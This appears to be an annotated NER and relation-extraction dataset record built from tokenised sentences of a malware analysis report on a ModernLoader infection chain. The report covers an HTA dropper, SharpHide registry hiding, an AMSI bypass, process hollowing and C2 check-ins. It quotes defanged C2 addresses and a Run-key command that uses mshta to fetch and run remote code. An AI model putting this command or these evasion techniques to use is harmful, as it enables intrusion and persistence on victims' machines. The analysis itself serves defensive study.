{"doc_key": "014", "sentences": [["The", "system", "was", "found", "to", "have", "executed", "a", "command", "."], ["An", "IP", "address", "(", "31.41.244.231", ")", "from", "Russia", "was", "discovered", ",", "which", "hosts", "multiple", "URLs", "with", "similar", "naming", "conventions", "."], ["The", "first", "command", "connects", "to", "a", "download", "server", "and", "downloads", "an", "HTA", "application", "with", "obfuscated", "script", "code", "using", "HTML", "Guardian", "to", "encrypt", "HTML", "code", ".", "The", "HTA", "file", "opens", "in", "a", "browser", "displaying", "its", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "VB", "script", "code", ",", "downloading", "and", "launching", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "initiating", "the", "loading", "process", "'", "next", "stage", "."], ["The", "module", "autorunnn.exe", "(", "d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ".", "It", "creates", "a", "hidden", "registry", "entry", "using", "the", "NtSetValueKey", "native", "API", "to", "add", "a", "null", "byte", "before", "the", "UNICODE_STRING", "key", "valuename", ",", "and", "sets", "the", "``", "\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "''", "command", "to", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "then", "tries", "to", "generate", "a", "scheduled", "task", "that", "runs", "when", "the", "user", "logs", "into", "the", "system", ".", "Named", "``", "OneDrive", "Standalone", "Update", "Task", ",", "''", "it", "attempts", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "registry", "startup", "entry", "is", "hidden", "using", "modified", "SharpHide", "code", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "is", "executed", "on", "the", "system", "during", "the", "logon", "sequence", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "scheduled", "task", "are", "set", "for", "downloading", "the", "next", "stage", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "that", "contains", "embedded", "code", "of", "three", "modules", ".", "Once", "the", "PowerShell", "code", "is", "downloaded", ",", "it", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "the", "AMSI", "scanning", "feature", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "third", "injects", "the", "payload", "into", "the", "newly", "created", "process", "space", ",", "typically", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "divided", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", ".", "The", "DLL", "overwrites", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ",", "which", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "following", "injector", "stage", "in", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Management.inf", ".", "It", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", ".", "The", "injector", "sets", "up", "a", "suspended", "svchost.exe", "process", "and", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3", ")", ",", "a", "ModernLoader", "instance", "."], ["ModernLoader", "collects", "the", "Win32_ComputerSystemProduct", "UUID", ",", "external", "IP", "address", ",", "IP", "address", "country", ",", "and", "user", "privileges", "during", "initialization", ".", "It", "sends", "this", "information", "to", "the", "C2", "server", "using", "HTTP", "Post", "requests", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", "."], ["The", "bot", "then", "periodically", "contacts", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", ".", "Its", "main", "purpose", "is", "to", "download", "and", "execute", "additional", "payloads", "and", "modules", ",", "as", "instructed", "by", "the", "C2", "server", ",", "using", "the", "function", "DoTask", "."]], "ner": [[], [[14, 14, "SO"]], [[31, 32, "MP"], [36, 37, "SO"], [41, 42, "MF"], [56, 56, "MP"], [61, 61, "TP"]], [[70, 70, "MP"], [73, 74, "MF"], [80, 81, "MP"], [83, 87, "SO"], [91, 92, "MP"]], [[99, 99, "MP"], [113, 113, "MP"], [117, 118, "SF"], [144, 144, "MP"], [149, 153, "SO"]], [[183, 183, "MP"], [195, 196, "MF"], [200, 204, "SO"]], [], [[221, 221, "MP"], [238, 239, "SF"]], [[256, 257, "MP"], [268, 269, "MP"], [278, 278, "MF"], [281, 281, "MF"]], [[296, 296, "MP"], [303, 303, "MP"], [312, 312, "TP"]], [[314, 314, "MP"], [338, 338, "MP"], [345, 345, "SF"]], [[364, 364, "MF"], [383, 383, "MP"], [387, 387, "MP"], [398, 398, "TP"]], [[434, 434, "MP"]], [], [[485, 485, "MP"], [491, 491, "MP"]], [[494, 494, "MP"], [514, 514, "MP"], [517, 517, "TF"], [520, 521, "SO"], [527, 529, "SO"]], [[537, 538, "SO"], [548, 548, "MP"], [557, 557, "MF"], [565, 566, "SO"]]], "relations": [[], [[14, 14, 36, 37, "CO"]], [[31, 32, 36, 37, "RF"], [31, 32, 36, 37, "ST"], [31, 32, 41, 42, "WR"], [31, 32, 61, 61, "FR"], [61, 61, 56, 56, "FR"], [56, 56, 70, 70, "CO"]], [[70, 70, 73, 74, "EX"], [70, 70, 80, 81, "FR"], [70, 70, 83, 87, "RF"], [80, 81, 91, 92, "FR"], [91, 92, 117, 118, "RD"], [91, 92, 113, 113, "CO"], [91, 92, 99, 99, "CO"]], [[113, 113, 117, 118, "WR"], [113, 113, 144, 144, "FR"], [144, 144, 149, 153, "ST"], [144, 144, 149, 153, "RF"], [144, 144, 183, 183, "CO"], [149, 153, 200, 204, "CO"]], [[183, 183, 195, 196, "WR"], [183, 183, 200, 204, "RF"], [183, 183, 221, 221, "FR"]], [], [[221, 221, 195, 196, "EX"], [221, 221, 238, 239, "RD"], [221, 221, 238, 239, "RD"], [221, 221, 238, 239, "WR"], [221, 221, 268, 269, "CO"], [221, 221, 256, 257, "CO"]], [[268, 269, 278, 278, "WR"], [268, 269, 281, 281, "WR"], [268, 269, 296, 296, "FR"], [268, 269, 314, 314, "FR"], [278, 278, 238, 239, "RD"], [278, 278, 238, 239, "WR"]], [[296, 296, 281, 281, "EX"], [303, 303, 312, 312, "FR"], [303, 303, 296, 296, "CO"], [296, 296, 383, 383, "CO"]], [[314, 314, 278, 278, "EX"], [314, 314, 345, 345, "RD"], [338, 338, 345, 345, "WR"], [314, 314, 338, 338, "CO"]], [[383, 383, 387, 387, "FR"], [387, 387, 364, 364, "EX"], [387, 387, 398, 398, "IJ"], [387, 387, 434, 434, "CO"]], [[434, 434, 485, 485, "FR"]], [], [[485, 485, 520, 521, "ST"], [485, 485, 520, 521, "RF"], [485, 485, 491, 491, "CO"], [485, 485, 514, 514, "CO"], [485, 485, 494, 494, "CO"], [485, 485, 548, 548, "CO"]], [[514, 514, 517, 517, "WR"], [514, 514, 527, 529, "ST"], [514, 514, 527, 529, "RF"], [527, 529, 537, 538, "CO"], [527, 529, 565, 566, "CO"]], [[548, 548, 557, 557, "WR"]]]}